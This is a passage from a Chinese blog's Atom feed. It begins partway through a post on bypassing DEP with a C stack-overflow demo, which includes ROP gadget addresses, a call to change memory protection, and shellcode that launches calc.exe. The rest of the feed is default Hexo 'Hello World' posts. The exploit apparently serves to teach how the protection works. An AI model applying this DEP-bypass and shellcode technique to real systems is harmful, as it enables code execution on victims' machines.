class="line">&quot;\x24\x01\x6f\x7d&quot;   //ret   </div><div class="line">&quot;\x90\x90\x90\x90&quot;  </div><div class="line">&quot;\xc6\xc6\xeb\x77&quot;   //77ebc6c6  push esp jmp eax  </div><div class="line">&quot;\x10\x01\x00\x00&quot;   //要修改的内存大小  </div><div class="line">&quot;\x40\x00\x00\x00&quot;   //可读可写可执行属性代码  </div><div class="line">&quot;\xc6\xc6\xeb\x77&quot;   //77ebc6c6  push esp jmp eax  </div><div class="line">  </div><div class="line">&quot;\x90\x90\x90\x90&quot;  </div><div class="line">&quot;\x90\x90\x90\x90&quot;  </div><div class="line">&quot;\xD9\x1A\x80\x7C&quot;//修改内存属性  </div><div class="line">  </div><div class="line">&quot;\x90\x90\x90\x90&quot;  </div><div class="line">&quot;\xEB\x30\x5A\x7D&quot;//jmp esp  </div><div class="line">  </div><div class="line">&quot;\x90\x90\x90\x90&quot;  </div><div class="line">&quot;\x90\x90\x90\x90&quot;  </div><div class="line">&quot;\x90\x90\x90\x90&quot;  </div><div class="line">&quot;\x90\x90\x90\x90&quot;  </div><div class="line">  </div><div class="line">&quot;\x90\x90\x90\x90&quot;  </div><div class="line">&quot;\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30&quot;  </div><div class="line">&quot;\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff&quot;  </div><div class="line">&quot;\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52&quot;  </div><div class="line">&quot;\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1&quot;  </div><div class="line">&quot;\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b&quot;  </div><div class="line">&quot;\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03&quot;  </div><div class="line">&quot;\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b&quot;  </div><div class="line">&quot;\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24&quot;  </div><div class="line">&quot;\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb&quot;  </div><div class="line">&quot;\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f&quot;  </div><div class="line">&quot;\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5&quot;  </div><div class="line">&quot;\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a&quot;  </div><div class="line">&quot;\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;  </div><div class="line">;  </div><div class="line">void test()  </div><div class="line">&#123;  </div><div class="line">    char tt[176];  </div><div class="line">    printf(&quot;ttttttttttttttttttttt\n&quot;);  </div><div class="line">    memcpy(tt,shellcode,sizeof(shellcode) + 1);  </div><div class="line">&#125;  </div><div class="line">int main()  </div><div class="line">&#123;  </div><div class="line">    HINSTANCE hInst = LoadLibrary(&quot;shell32.dll&quot;);  </div><div class="line">    char temp[200];  </div><div class="line">    test();  </div><div class="line">    return 0;  </div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h1 id=&quot;0x01-简介&quot;&gt;&lt;a href=&quot;#0x01-简介&quot; class=&quot;headerlink&quot; title=&quot;0x01 简介&quot;&gt;&lt;/a&gt;0x01 简介&lt;/h1&gt;&lt;p&gt;DEP （Data Execution Prevention）数
      
    
    </summary>
    
      <category term="编程" scheme="http://yoursite.com/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="机制" scheme="http://yoursite.com/tags/%E6%9C%BA%E5%88%B6/"/>
    
      <category term="DEP" scheme="http://yoursite.com/tags/DEP/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://yoursite.com/2017/10/17/action/"/>
    <id>http://yoursite.com/2017/10/17/action/</id>
    <published>2017-10-17T02:33:52.756Z</published>
    <updated>2017-10-09T17:42:02.752Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo new <span class="string">"My New Post"</span></div></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo server</div></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo generate</div></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo deploy</div></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://yoursite.com/2017/10/17/hello-world/"/>
    <id>http://yoursite.com/2017/10/17/hello-world/</id>
    <published>2017-10-17T02:33:52.756Z</published>
    <updated>2017-10-09T16:18:03.381Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo new <span class="string">"My New Post"</span></div></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo server</div></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo generate</div></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo deploy</div></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.
      
    
    </summary>
    
    
  </entry>
  
</feed>
